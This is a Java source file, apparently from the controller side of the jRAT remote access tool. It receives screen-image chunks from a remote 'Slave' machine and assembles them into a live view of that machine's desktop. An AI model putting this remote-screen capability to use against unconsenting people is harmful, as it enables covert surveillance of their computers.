package se.jrat.client.packets.incoming;

import java.awt.Graphics2D;
import java.awt.image.BufferedImage;
import java.io.DataInputStream;

import se.jrat.client.Slave;
import se.jrat.client.ui.frames.FrameRemoteScreen;
import se.jrat.common.utils.ImageUtils;

public class Packet17RemoteScreen extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int chunkWidth = slave.readInt();
		int chunkHeight = slave.readInt();
		int x = slave.readInt();
		int y = slave.readInt();
		int width = slave.readInt();
		int height = slave.readInt();
		
		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);

		int blen = slave.readInt();
	
		byte[] buffer = new byte[blen];
		slave.getDataInputStream().readFully(buffer);

		if (frame != null) {
			frame.setTransmitted(frame.getTransmitted() + blen);
			frame.setChunks(frame.getChunks() + 1);
			BufferedImage bufferedImage = frame.getBuffer();

			if (bufferedImage == null || bufferedImage != null && bufferedImage.getWidth() != width && bufferedImage.getHeight() != height) {
				bufferedImage = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
				frame.setBuffer(bufferedImage);
			}

			try {
				Graphics2D imageGraphics = (Graphics2D) bufferedImage.getGraphics();

				BufferedImage image = ImageUtils.decodeImage(buffer);
				imageGraphics.drawImage(image, y * chunkWidth, x * chunkHeight, null);

				frame.update(bufferedImage);
			} catch (Exception ex) {
				ex.printStackTrace();
				System.gc();
			}
		}
	}
}
